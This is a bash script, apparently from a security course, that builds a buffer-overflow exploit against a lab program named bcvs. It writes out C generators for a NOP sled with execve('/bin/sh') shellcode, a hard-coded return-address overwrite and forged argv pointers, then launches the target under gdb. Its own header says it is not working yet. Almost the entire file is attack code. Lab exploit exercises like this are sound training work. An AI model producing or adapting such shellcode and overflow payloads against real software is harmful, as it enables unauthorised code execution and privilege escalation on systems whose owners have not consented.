#!/bin/bash


## -------------------- Exploit Description ---------------------- ##
## This exploit takes advantage of the buffer overflow of 'log' in
## main. This overflow needs to be carefully crated to not cause
## problems with other function calls like copyFile.
##
## Not working at the moment
## --------------------------------------------------------------- ##

rm -rf sploit4_dir
mkdir sploit4_dir
cd sploit4_dir
mkdir .bcvs
touch .bcvs/block.list

## The following section hold the text for any supporting programs or
## scripts for this sploit.

rm -f run_w_gdb.sh
cat <<EOS > "run_w_gdb.sh"
#!/bin/bash
SC=\$(./gen_shellcode)
PAD="123456789012"
SC_ADD=\$(./././gen_argv co "\${SC}\${PAD}")

gdb --args /opt/bcvs/bcvs co "\${SC}\${SC_ADD}"
EOS
chmod +x run_w_gdb.sh


cat <<EOS > "test_gen_argv.sh"
#!/bin/bash
SC=\$(./gen_shellcode)
echo \${SC}
./././gen_argv co "123456789012\${SC}"
EOS
chmod +x test_gen_argv.sh

cat <<EOS > "rerun_sploit.sh"
#!/bin/bash
# This is for convenience. You need to run this using the source
# operator ". rerun_sploit.sh" or "source rerun_sploit.sh"
cd ..
./sploit.sh
cd sploit4_dir
EOS
chmod +x rerun_sploit.sh

rm -f gen_shellcode.c  # Just to make sure we get the newest version
cat <<EOS > "gen_shellcode.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 201
#define NOP 0x90
#define nop_shell_size  253
#define total_bsize 290

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char cf_ret_ptr[] = "";
char null_byte_ptr[] = "\x3C\xF6\xFF\xBF";  // 0xbffff63C

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

int main(int argc, char* argv[]) {
  char buf[total_bsize+1];
  char *ptr;
  long *long_ptr, addr;
  int i = 0;
  int offset=DEFAULT_OFFSET;

  if (argc > 1) offset = atoi(argv[1]);

  addr = get_sp() - offset;
  //printf("Using address: 0x%x\n", addr);
  ptr = buf;

  // Fill in nops for the sled
  for (i = 0; i < total_bsize; ++i) {
    buf[i] = NOP;
  }

  // Fill the shellcode at the end of the 'nop_shell_size'
  ptr += (nop_shell_size - strlen(shellcode));
  for (i = 0; ptr < (buf + nop_shell_size); ++i) {
    *(ptr++) = shellcode[i];
  }

  // Fill in the return pointer for copyFile 0x8048c23
  *(ptr++) = 0x23;
  *(ptr++) = 0x8c;
  *(ptr++) = 0x04;
  *(ptr++) = 0x08;

  // Now we need a pointer to a null byte (ie the end of log after it's overwritten)
  memcpy(ptr, null_byte_ptr, 4);
  ptr += 4;

  ++ptr;
  while((ptr + 4) <= (buf + total_bsize)) {
    memcpy(ptr, &addr, 4);
    ptr += 4;
  }

  buf[total_bsize] = '\0';
  printf(buf);

  return 0;
}
EOS

rm -f gen_argv.c
cat <<EOS > "gen_argv.c"
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
  if (argc != 3) {
    printf("Usage: [co|ci] <shellcode text>\n");
    return -1;
  }

  char buf[13] = {0};
  char temp_buf[5] = {0};
  long* lptr;

  // We are going to use this address to make the code jump around
  // while trying to dereference argv[2] and hopefully (cross your fingers)
  // it will land at the end of the log buffer (.comments\0) and just
  // stop

  // Here is the assembly that we are concerned with:
  // 0x08048c13 <+438>:mov    0xc(%ebp),%eax
  // 0x08048c16 <+441>:add    $0x8,%eax
  // 0x08048c19 <+444>:mov    (%eax),%eax
  // 0x08048c168c1b <+446>:mov    %eax,(%esp)
  // 0x08048c1e <+449>:call   0x8048c85     <copyFile>
  //
  // Rather than making copyFile(argv[2]) pass in the real argv[2] we want
  // to make it point to some other memory that preferrably is just a null
  // terminating byte. We have to deal with this since .comments overwrites
  // the return address for main during our exploit.

  register long* addr asm("ebp");
  /*
  printf("%x\n", addr);
  printf("Length of argv[2] = %d\n", strlen(argv[2]));
  printf("argv[0] = %s\n", argv[0]);
  printf("argc = %d\n", argc);
*/
  temp_buf[4] = '\0';
  lptr = (long*) temp_buf;
  //*(lptr) = (long*) &argv;
  *(lptr) = (long) (addr+16); //Overwrite argc to one byte past argv
  strncat(buf, temp_buf, 5);

  *(lptr) = (long) addr; // argv will now point back to %ebp
  strncat(buf, temp_buf, 5);

  *(lptr) = (long) (addr + 24); // This should point to where .comments\0 will end
  strncat(buf, temp_buf, 5);

  buf[12] = '\0';
  printf("%s", buf);

  return 0;
}
EOS

gcc -o gen_shellcode gen_shellcode.c
gcc -o gen_argv gen_argv.c
SHELLCODE=$(./gen_shellcode)
if [[ $? != "0" ]]; then
  echo "Failed to generate shellcode"
  exit -1;
fi
echo "Shellcode length: ${#SHELLCODE}"


# Since the string passed to bcvs eventually will have 8 more
# bytes (SC_ADDITION) we need to simulate this when calling
# here so the stack addresses are correct
PAD="123456789012"
SC_ADDITION=$(./././gen_argv co "${SHELLCODE}${PAD}")
if [[ $? != "0" ]]; then
  echo "Failed to generate shellcode addition"
  exit -1;
fi
echo "Shellcode addition: $SC_ADDITION"
echo "Length of shellcode addition: ${#SC_ADDITION}"

cat <<EOS > "run_gdb"
break main
EOS
#/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}"

gdb --args /opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}" < run_gdb
